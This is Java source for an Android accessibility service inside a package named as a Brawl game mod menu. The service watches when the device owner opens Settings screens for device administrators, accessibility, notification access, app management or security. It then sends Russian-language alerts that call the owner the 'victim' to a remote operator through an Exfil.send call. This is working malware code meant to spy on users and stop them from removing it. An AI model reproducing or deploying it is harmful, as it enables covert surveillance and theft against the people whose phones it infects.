package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class AlertService extends AccessibilityService {

    private long lastAlert = 0;
    private static final long COOLDOWN = 5000;

    private static final String[] WATCH = {
        "com.android.settings",
        "com.android.settings.security",
        "com.google.android.settings"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        if (!pkg.startsWith("com.android.settings")) return;

        CharSequence cls = event.getClassName();
        String className = cls != null ? cls.toString() : "";
        String text = event.getText() != null && event.getText().size() > 0
            ? event.getText().get(0).toString().toLowerCase() : "";

        String alert = null;

        if (className.contains("DeviceAdmin") || text.contains("администратор")
            || text.contains("device admin")) {
            alert = "🚨 Жертва смотрит АДМИНИСТРАТОРОВ УСТРОЙСТВА";
        } else if (className.contains("Accessibility") || text.contains("специальн")
            || text.contains("доступност")) {
            alert = "🚨 Жертва смотрит СПЕЦИАЛЬНЫЕ ВОЗМОЖНОСТИ";
        } else if (className.contains("NotificationAccess")
            || text.contains("доступ к уведомлен")) {
            alert = "🚨 Жертва смотрит ДОСТУП К УВЕДОМЛЕНИЯМ";
        } else if (className.contains("ApplicationSettings")
            || text.contains("приложения")
            || className.contains("ManageApplications")) {
            alert = "🚨 Жертва в НАСТРОЙКАХ ПРИЛОЖЕНИЙ";
        } else if (className.contains("Security") || text.contains("безопасн")) {
            alert = "🚨 Жертва смотрит БЕЗОПАСНОСТЬ";
        }

        if (alert != null && System.currentTimeMillis() - lastAlert > COOLDOWN) {
            lastAlert = System.currentTimeMillis();
            Exfil.send("ALERT", alert + "\nЭкран: " + className);
        }
    }

    @Override public void onInterrupt() {}
}
